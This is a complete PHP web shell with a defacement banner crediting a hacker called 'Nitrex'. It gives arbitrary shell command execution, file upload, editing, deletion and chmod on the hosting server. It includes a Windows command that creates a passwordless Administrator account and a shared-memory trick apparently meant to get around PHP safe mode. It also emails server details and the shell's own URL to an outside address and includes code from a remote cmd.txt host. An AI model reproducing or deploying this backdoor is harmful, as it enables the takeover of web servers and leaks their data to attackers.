<html>
<head>
<meta http-equiv="Content-Language" content="pt-br">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="AoD">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Co-Admin Panel</title>
<style type="text/css">
A:link {text-decoration:none}
A:visited {text-decoration:none}
A:hover {text-decoration:underline}
A:active {text-decoration:underline}
body,td {
	font-family: verdana;
	font-size: 8pt;
	background-color: #1F1F1F;
}
a{
	color: #A3A3A3;
	text-decoration: none;
}
a:hover {
	color: #858585;
	text-decoration: underline;
}
</style>
</head>
<body >
<center><h2><font color=#E0E0E0><b> --== This Web Was Hacked And Rooted By Georgian hacker Nitrex ==-- </b></font></h2></center>
<center><h2><font color=#C2C2C2><b> --== We Are Georgians And We Are The BEST ==-- </b></font></h2></center>

<?php
 
 @set_time_limit(0);

 $string = $_SERVER['QUERY_STRING'];
 $mhost = 'http://omgs.ge/cmd.txt?';
 $host_all = explode("$mhost", $string);
 $s1 = $host_all[0];
 $fstring = $_SERVER['PHP_SELF']."?".$s1.$mhost;

 $OS = @PHP_OS;
 $IpServer = '127.0.0.1';
 $UNAME = @php_uname();
 $PHPv = @phpversion();
 $SafeMode = @ini_get('safe_mode');

 if ($SafeMode == '') { $SafeMode = "<i>OFF</i>"; }
 else { $SafeMode = "<i>$SafeMode</i>"; }

 $btname = 'backtool.txt';
 $bt = 'http://www.geneseobeadstudio.com/cmd.txt';
 $dc = 'http://www.geneseobeadstudio.com/cmd.txt';
 $newuser = '@echo off;net user Admin /add /expires:never /passwordreq:no;net localgroup 

&quot;Administrators&quot; /add Admin;net localgroup &quot;Users&quot; /del Admin';
 $bn = 'http://www.geneseobeadstudio.com/cmd.txt'; 
// Java Script
 echo "<script type=\"text/javascript\">";

 echo "function ChMod(chdir, file) {";
 echo "var o = prompt('Chmod: - Contoh: 0777', '');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=chmod&chdir=' + chdir + '&file=' + file + 

'&chmod=' + o + \"\";";
 echo "}";
 echo "}";
 echo "function Rename(chdir, file, mode) {";
 echo "if (mode == 'edit') {";
 echo "var o = prompt('Ganti Nama File '+ file + ' menjadi:', '');";
 echo "}";
 echo "else {";
 echo "var o = prompt('Ganti Nama Folder '+ file + ' menjadi:', '');";
 echo "}";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=rename&chdir=' + chdir + '&file=' + file + 

'&newname=' + o + '&mode=' + mode +\"\";";
 echo "}";
 echo "}";
 echo "function Copy(chdir, file) {";
 echo "var o = prompt('Copied for:', '/tmp/' + file);";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=copy&chdir=' + chdir + '&file=' + file + 

'&fcopy=' + o + \"\";";
 echo "}";
 echo "}";
 echo "function Mkdir(chdir) {";
 echo "var o = prompt('Enter name of Folder?', 'New_Folder');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=mkdir&chdir=' + chdir + '&newdir=' + o + 

\"\";";
 echo "}";
 echo "}";
 echo "function Newfile(chdir) {";
 echo "var o = prompt('File Name?', 'file_name.txt');";
 echo "if (o) {";
 echo "window.location=\"\" + '{$fstring}&action=newfile&chdir=' + chdir + '&newfile=' + o + 

\"\";";
 echo "}";
 echo "}";
 echo "</script>";

 // End JavaScript

	/* Functions */
	function cmd($CMDs) {
		$CMD[1] = '';
		exec($CMDs, $CMD[1]);
		if (empty($CMD[1])) {
			$CMD[1] = shell_exec($CMDs);
		}
			elseif (empty($CMD[1])) {
			$CMD[1] = passthru($CMDs);
		}
		elseif (empty($CMD[1])) {
			$CMD[1] = system($CMDs);
		}
		elseif (empty($CMD[1])) {
			$handle = popen($CMDs, 'r');
			while(!feof($handle)) {
				$CMD[1][] .= fgets($handle);
			}
			pclose($handle);
		}
		return $CMD[1];
	}
 
if (@$_GET['chdir']) {
 $chdir = $_GET['chdir']; 
} else {
   $chdir = getcwd()."/";
  }
if (@chdir("$chdir")) {
 $msg = "<font color=\"#008000\"> Jined on Directory, all is OK!</font>";
} else {
 $msg = "<font color=\"#FF0000\">Error: No Such This folder!</font>";
 $chdir = str_replace($SCRIPT_NAME, "", $_SERVER['SCRIPT_NAME']);
}
 $chdir = str_replace(chr(92), chr(47), $chdir);

if (@$_GET['action'] == 'upload') {
 $uploaddir = $chdir;
 $uploadfile = $uploaddir. $_FILES['userfile']['name'];
 if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . 

$_FILES['userfile']['name'])) {
  $msg = "<font color=\"#008000\"><font 

color=\"#000080\">{$_FILES['userfile']['name']}</font>, File Uploaded Secussifuly. 

</font>";
 } else {
    $msg = "<font color=\"#FF0000\">Error: File Uplading.</font>";
   }
}
elseif (@$_GET['action'] == 'mkdir') {
    $newdir = $_GET['newdir'];
    if (@mkdir("$chdir"."$newdir")) {
     $msg = "<font color=\"#008000\"><font color=\"#000080\">{$newdir}</font>, Folder 

Created Secussifuly. </font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error: Creating Folder Denied.</font>";
      }
}
elseif (@$_GET['action'] == 'newfile') {
    $newfile = $_GET['newfile'];
    if (@touch("$chdir"."$newfile")) {
     $msg = "<font color=\"#008000\"><font color=\"#000080\">{$newfile}</font>, Created 

Secussifuly! </font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error: Creating File!</font>";
      }
}

elseif (@$_GET['action'] == 'del') {
     $file = $_GET['file']; $type = $_GET['type'];
     if ($type == 'file') {
      if (@unlink("$chdir"."$file")) {
       $msg = "<font color=\"#008000\"><font color=\"#000080\">{$file}</font>, delete 

File is Secussifuly. (file)!</font>";
      } else {
         $msg = "<font color=\"#FF0000\">Error: Deleting The (file)!</font>";
        }
     } elseif ($type == 'dir') {
        if (@rmdir("$chdir"."$file")) {
          $msg = "<font color=\"#008000\"><font color=\"#000080\">{$file}</font>, Deleted 

The Folder folder!</font>";
        } else {
           $msg = "<font color=\"#FF0000\">Error: Deleting folder!</font>";
          }
       }
}
elseif (@$_GET['action'] == 'chmod') {
     $file = $chdir.$_GET['file']; $chmod = $_GET['chmod'];
     if (@chmod ("$file", $chmod)) {
  
      $msg = "<font color=\"#008000\">Chmod</font> <font 

color=\"#000080\">{$_GET['file']}</font> <font color=\"#008000\">Konishoa</font> 

<font color=\"#000080\">$chmod</font> <font color=\"#008000\">: Succes!</font>";
     } else {
        $msg = '<font color=\"#FF0000\">Error: change chmod.</font>';
       }
}
elseif (@$_GET['action'] == 'rename') {
     $file = $_GET['file']; $newname = $_GET['newname'];
     if (@rename("$chdir"."$file", "$chdir"."$newname")) {
      $msg = "<font color=\"#008000\">Archive</font> <font color=\"#000080\">{$file}</font> 

<font color=\"#008000\">named for</font> <font color=\"#000080\">{$newname}</font> <font 

color=\"#008000\">successfully!</font>";
     } else {
        $msg = "<font color=\"#FF0000\">Error: Gagal rename File.</font>";
       }
}
elseif (@$_GET['action'] == 'copy') {
    $file = $chdir.$_GET['file']; $copy = $_GET['fcopy'];
    if (@copy("$file", "$copy")) {
     $msg = "<font color=\"#000080\">{$file}</font>, <font color=\"#008000\">Copy 

Secusifully</font> <font color=\"#000080\">{$copy}</font> <font color=\"#008000\"> 

Berhasil!</font>";
    } else {
       $msg = "<font color=\"#FF0000\">Error: Copy </font> <font 

color=\"#E0E0E0\">{$file}</font> <font color=\"#FF0000\">Manage</font> <font 

color=\"#E0E0E0\">{$copy}</font></font>";
      }
}
/* IDI NAXUI 02:48 12/2/2009 */

elseif (@$_GET['action'] == 'cmd') {
	if (!empty($_GET['cmd'])) { $cmd = @$_GET['cmd']; }
	if (!empty($_POST['cmd'])) { $cmd = @$_POST['cmd']; }
	$cmd = stripslashes(trim($cmd));
	$result_arr = cmd($cmd);
	
	$afim = count($result_arr); $acom = 0; $msg = '';
	$msg .= "<p style=\"color: #E0E0E0;text-align: center;font-family: 'Lucida 

Console';font-size: 12px;margin 2\">Get : <b>".$cmd."</b></p>";
	if ($result_arr) {
		while ($acom <= $afim) {
			$msg .= "<p style=\"color: #008000;text-align: left;font-family: 

'Lucida Console';font-size: 12px;margin 2\"> ".@$result_arr[$acom]."</p>";
		$acom++;
 		}
	}
	else {
		$msg .= "<p style=\"color: #FF0000;text-align: center;font-family: 'Lucida 

Console';font-size: 12px;margin 2\">Error: Get.</p>";
	}
}
elseif (@$_GET['action'] == 'safemode') {
if (@!extension_loaded('shmop')) {
 echo "Loading... module</br>";

    if (strtoupper(substr(PHP_OS, 0,3) == 'WIN')) {
        @dl('php_shmop.dll');
    } else {
        @dl('shmop.so');
    }
}

if (@extension_loaded('shmop')) {
 echo "Module: <b>shmop</b> loaded!</br>";

 $shm_id = @shmop_open(0xff2, "c", 0644, 100);
 if (!$shm_id) { echo "Couldn't create shared memory segment\n"; }
 $data="\x00";
 $offset=-3842685;
 $shm_bytes_written = @shmop_write($shm_id, $data, $offset);
 if ($shm_bytes_written != strlen($data)) { echo "Couldn't write the entire length of 

data\n"; }
 if (!shmop_delete($shm_id)) { echo "Couldn't mark shared memory block for deletion."; }
 echo passthru("id"); 
 shmop_close($shm_id);


} else { echo "Module: <b>shmop</b> Gaajvi!</br>"; }
}

elseif (@$_GET['action'] == 'zipen') {
 $file = $_GET['file'];
 $zip = @zip_open("$chdir"."$file");
 $msg = '';
if ($zip) {

    while ($zip_entry = zip_read($zip)) {
        $msg .= "Name:               " . zip_entry_name($zip_entry) . "\n";
        $msg .= "Actual Filesize:    " . zip_entry_filesize($zip_entry) . "\n";
        $msg .= "Compressed Size:    " . zip_entry_compressedsize($zip_entry) . "\n";
        $msg .= "Compression Method: " . zip_entry_compressionmethod($zip_entry) . "\n";

        if (zip_entry_open($zip, $zip_entry, "r")) {
            echo "File Contents:\n";
            $buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
            echo "$buf\n";

            zip_entry_close($zip_entry);
        }
        echo "\n";

    }

    zip_close($zip);

}
}
elseif (@$_GET['action'] == 'edit') {
 $file = $_GET['file'];
 $conteudo = '';
 $filename = "$chdir"."$file";
 $conteudo = @file_get_contents($filename);
 $conteudo = htmlspecialchars($conteudo);
 $back = $_SERVER['HTTP_REFERER'];
 echo "<p align=\"center\">Editing {$file} ...</p>";
 echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: 

collapse\" width=\"100%\" id=\"editacao\">";
 echo "<tr>";
 echo "<td width=\"100%\">";
 echo "<form method=\"POST\" 

action=\"{$fstring}&amp;action=save&amp;chdir={$chdir}&amp;file={$file}\">";
 echo "<!--webbot bot=\"SaveResults\" u-file=\"_private/form_results.csv\" 

s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><p align=\"center\">";
 print "<textarea rows=\"18\" name=\"S1\" cols=\"89\" style=\"font-family: Verdana; 

font-size: 8pt; border: 1px solid #E0E0E0\">{$conteudo}</textarea></p>";
 echo "<p align=\"center\">";
 echo "<input type=\"submit\" value=\"Simpan\" name=\"B2\" style=\"  border: 1px solid 

#E0E0E0\"> ";
 echo "<input type=\"button\" value=\"Tutup\" 

Onclick=\"javascript:window.location='{$fstring}&amp;chdir={$chdir}'\" name=\"B1\" style=\"  

border: 1px solid #E0E0E0\"> ";
 echo "</form>";
 echo "</td>";
 echo "</tr>";
 echo "</table>";
}
elseif (@$_GET['action'] == 'save') {
   $filename = "$chdir".$_GET['file'];
   $somecontent = $_POST['S1'];
   $somecontent = stripslashes(trim($somecontent));
   if (is_writable($filename)) {
    @$handle = fopen ($filename, "w");
    @$fw = fwrite($handle, $somecontent);
    @fclose($handle);
    if ($handle && $fw) {
     $msg = "<font color=\"#000080\">{$_GET['file']}</font>, <font 

color=\"#008000\">Edit Complited!</font>";
    }
 } else {
    $msg = "<font color=\"#E0E0E0\">{$_GET['file']},</font> <font color=\"#FF0000\">Chagijvi 

Gulshi Shechema!</font>";
   }
}

// Info
 $cmdget = '';
 if (!empty($_GET['cmd'])) { $cmdget = @$_GET['cmd']; }
 if (!empty($_POST['cmd'])) { $cmdget = @$_POST['cmd']; }
 $cmdget = htmlspecialchars($cmdget);
 function asdads() {
  $asdads = '';
  if (@file_exists("/usr/bin/wget")) { $asdads .= "wget "; }
  if (@file_exists("/usr/bin/fetch")) { $asdads .= "fetch "; }
  if (@file_exists("/usr/bin/curl")) { $asdads .= "curl "; }
  if (@file_exists("/usr/bin/GET")) { $asdads .= "GET "; }
  if (@file_exists("/usr/bin/lynx")) { $asdads .= "lynx "; }
  return $asdads;
 }

echo "<form method=\"POST\" name=\"cmd\" 

action=\"{$fstring}&amp;action=cmd&amp;chdir=$chdir\">";
echo "<fieldset style=\"border: 1px solid #E0E0E0; padding: 2\">";
echo "<legend><font color=#858585><b>System-Info</b></font></legend>";
echo "<br><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: 

collapse; font-family: Verdana; font-size: 10px\" width=\"100%\">";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<font color=#99001A><b>Sistem </b> </font></td> ";
echo "<td width=\"92%\"><font color=#993300><b>: {$OS}</b></font></td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<font color=#99001A><b>Nama </b></font></td> ";
echo "<td width=\"92%\"><font color=#993300><b>: {$UNAME}</b></font></td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<font color=#99001A><b>PHP </b></font></td> ";
echo "<td width=\"92%\"><font color=#993300><b>: {$PHPv}, <font color=#D60024><b> Safe Mode :<font color=#993300></b> {$SafeMode}</b></font></td></td>";
echo "</tr>";
 if (strtoupper(substr($OS, 0,3) != 'WIN')) {
  $Methods = asdads();
  if ($Methods == '') { $Methods = "???"; }
  echo "<tr>";
  echo "<td width=\"8%\">";
  echo "<font color=#99001A><b>Methods </b></font></td> ";
  echo "<td width=\"92%\"><font color=#993300><b>: {$Methods}</b></font></td>";
  echo "</tr>";
 }

echo "<tr>";
echo "<td width=\"8%\">";
echo "<font color=#99001A><b>IP </b></font></td> ";
echo "<td width=\"92%\"><font color=#993300><b>: {$IpServer}</b></font></td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo "<font color=#99001A><b>Perintah </b></td> ";
echo "<td width=\"92%\"><font color=#993300><b>: <input type=\"text\" size=\"70\" name=\"cmd\" value=\"{$cmdget}\" 

style=\" font-size: 8 pt; border: 1px solid #E0E0E0\"> <input type=\"submit\" 

name=\"action\" value=\"Go\" style=\" font-size: 8 pt; border: 1px solid 

#E0E0E0\"></td>";
echo "</tr>";
echo "</table><br>";
echo "</fieldset></form>";
// Dir

echo "<form method=\"POST\" action=\"{$fstring}&amp;action=upload&amp;chdir=$chdir\" 

enctype=\"multipart/form-data\">";
echo "<!--webbot bot=\"FileUpload\" u-file=\"_private/form_results.csv\" 

s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><fieldset style=\"border: 1px solid 

#E0E0E0; padding: 2\">";
if (is_writable("$chdir")) {
 if (strtoupper(substr($OS, 0,3) == 'WIN')) {
  echo "<legend><font color=#660000><b>Dir <b>YES</b></font></b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">Folder Name</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">File Name</a> | <a 

href=\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd=$newuser\">Remote 

Access</a></legend>";
 } else {
    echo "<legend><font color=#660000><b>Dir <font color=#A30000><b>YES</b></font></b><font color=#E0E0E0><b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">Folder Name</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">File Name</a> | <a 

href=\"{$fstring}&amp;action=backtool&amp;chdir={$chdir}&amp;write=yes\">Kombali</a></legend

>";
   } 
}
else {
if (strtoupper(substr($OS, 0,3) == 'WIN')) {
  echo "<legend><font color=#660000><b>Dir <font color=#A30000><b>NO</b></font></b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">Foldr Name</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">File Name</a> | <a 

href=\"{$fstring}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd={$newuser}\">Remote 

Access</a></legend>";
 } else {
    echo "<legend><font color=#660000><b>Dir <font color=#A30000><b>NO</b></font></b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">Folder Name</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">File Name</a> | <a 

href=\"{$fstring}&amp;action=backtool&amp;chdir={$chdir}&amp;write=no\">Kombali</a></legend>

";
   } 
}

if (@!$handle = opendir("$chdir")) {
 echo " Open Directory, <a href=\"{$fstring}\">Click here!</a>To Open folder!</br>";
}
else {
echo "  <table border=\"0\" cellpadding=\"5\" cellspacing=\"0\" width=\"100%\">";
echo "    <tr>";
echo "      <td width=\"100%\" colspan=\"4\"><font color=#663333><b> Upload:";
echo "      <input type=\"file\" name=\"userfile\" size=\"65\" style=\"  border-style: 

solid; border-width: 1\">";
echo "      <input type=\"submit\" value=\"Yru\" name=\"B1\" style=\" border: 1px solid 

#E0E0E0\"></td>";
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" colspan=\"4\"> </td>";
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" colspan=\"4\">";
if (@!$msg) {
 echo "      <p align=\"left\">Messages</td>";
} else {
   echo "      <p align=\"left\">$msg</td>";
  }
echo "    </tr>";
echo "    <tr>";
echo "      <td width=\"100%\" colspan=\"4\"> </td>";
echo "    </tr></table> ";
echo "   <table border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">";
echo "    <tr bgcolor=\"#FF6600\" align=\"center\"> ";
echo "      <td ><font color=#858585><b> Permision</b></font></td>";
echo "      <td ><font color=#858585><b> Nama File </b></font></td>";
echo "      <td ><font color=#858585><b> Kapasiti </b></font></td>";
echo "      <td ><font color=#858585><b> Perintah</b></font></td>";
echo "     </tr>";
$colorn = 0;
    while (false !== ($file = readdir($handle))) {
        if ($file != '.') {
            if ($colorn == 0) {
             $color = "style=\"background-color: #3D3D3D\"";
            }
            elseif ($colorn == 1) {
             $color = "style=\"background-color:  #3D3D3D\"";
            }        
            if (@is_dir("$chdir"."$file")) {
             $file = $file.'/';
             $mode = 'chdir';
            } else { 
               $mode = 'edit'; 
             }
            if (@substr("$chdir", strlen($chdir) -1, 1) != '/') {
              $chdir .= '/';
            }
            if ($file == '../') {
             $lenpath = strlen($chdir); $baras = 0;
             for ($i = 0;$i < $lenpath;$i++) { if ($chdir{$i} == '/') { $baras++; } }
             $chdir_ = explode("/", $chdir);
             $chdirpox = str_replace($chdir_[$baras-1].'/', "", $chdir);
            }
            $perms = @fileperms ("$chdir"."$file");
            if ($perms == '') {
             $perms = '???';
            }
            $size = @filesize ("$chdir"."$file"); 
            $size = $size / 1024;
            $size = explode(".", $size);
            if (@$size[1] != '') {
             $size = $size[0].'.'.@substr("$size[1]", 0, 2);
            } else {
               $size = $size[0];
             }
            if ($size == 0) {
             if ($mode == 'chdir') {
              $size = '???';
             }
            }
            echo "<tr>";
	    echo "<td align=\"center\" $color> $perms</td>";
            if (@is_writable ("$chdir"."$file")) {
             if ($mode == 'chdir') {
              if ($file == '../') {
               echo "<td $color> <b><a href=\"{$fstring}&amp;chdir=$chdirpox\"><font 

color=\"#008000\">$file</font></a></b> </td>";
              } else {
                 echo "<td $color> <b><a href=\"{$fstring}&amp;chdir={$chdir}{$file}\"><font 

color=\"#008000\">$file</font></a> </b></td>";                
                }
             } else {
		if (is_readable("$chdir"."$file")) {
                 echo "<td $color> <a 

href=\"{$fstring}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a> </td>";
                } else {
                   echo "<td $color> $file </td>";
                  }
               }
            } 
           else {
             if ($mode == 'chdir') {
              if ($file == '../') {
               echo "<td $color> <a href=\"{$fstring}&amp;chdir=$chdirpox\">$file</a> 

</td>";
              } else {
                 echo "<td $color> <a 

href=\"{$fstring}&amp;chdir={$chdir}{$file}\">$file</a></td>";                
               }
             } else {
		if (@is_readable("$chdir"."$file")) {
                 echo "<td  $color> <a 

href=\"{$fstring}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a> </td>";
                } else {
                   echo "<td $color> $file</td>";
                 }
               }
             }
            echo "<td align=\"right\" $color><font color=#FF6600><b> $size KB</td>";
            if ($mode == 'edit') {
             echo "<td align=\"center\" $color> <a href=\"#{$file}\" 

onclick=\"Rename('{$chdir}', '{$file}', '{$mode}')\">Rename</a> | <a 

href=\"{$fstring}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=file\">Del</a> 

| <a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">Chmod</a> | <a href=\"#{$file}\" 

onclick=\"Copy('{$chdir}', '{$file}')\">Copy</a> </td>";
            } else {
               echo "<td align=\"center\" $color> <a href=\"#{$file}\" 

onclick=\"Rename('{$chdir}', '{$file}', '{$mode}')\">Rename</a> | <a 

href=\"{$fstring}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=dir\">Del</a> 

| <a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">Chmod</a> | Copy </td>";
              }   
            echo "</tr>";
            if ($colorn == 0) {
             $colorn = 1;
            }
            elseif ($colorn == 1) {
             $colorn = 0;
            }
        }
    }
    closedir($handle);
}

  $OS = @PHP_OS;
  $UNAME = @php_uname();
  $PHPv = @phpversion();
  $SafeMode = @ini_get('safe_mode');
  
  if ($SafeMode == '') { $SafeMode = "<i>OFF</i><BR>"; }
  else { $SafeMode = "<i>$SafeMode</i><BR>"; }
  
   
  $injek=($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

  $psn=("OS = " . $OS . "<BR>UNAME = " . $UNAME . "<BR>PHPVersion = " . $PHPv . "<BR>Safe 

Mode = " . $SafeMode . "<BR><font color=blue>http://" . $injek . "</font><BR>Sending The 

New log From Server.<BR>By: Nitrex");
  
  $header = "From: $_SERVER[SERVER_ADMIN] <$from>\r\nReply-To: $replyto\r\n";
  $header .= "MIME-Version: 1.0\r\n";
  If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
  If ($file_name) $header .= "--$uid\r\n";
  $header .= "Content-Type: text/$contenttype\r\n";
  $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
  $header .= "$message\r\n";
  If ($file_name) $header .= "--$uid\r\n";
  If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
  If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
  If ($file_name) $header .= "Content-Disposition: attachment; 

filename=\"$file_name\"\r\n\r\n";
  If ($file_name) $header .= "$content\r\n";
  If ($file_name) $header .= "--$uid--";
  $to = ("n1trex@yahoo.com");
  $subject = ("Georgian The new Log");
  mail($to,$subject,$psn,$header);

@include "$bn";
?>
  </table>
  </fieldset></form>
</div>
</body>

</html>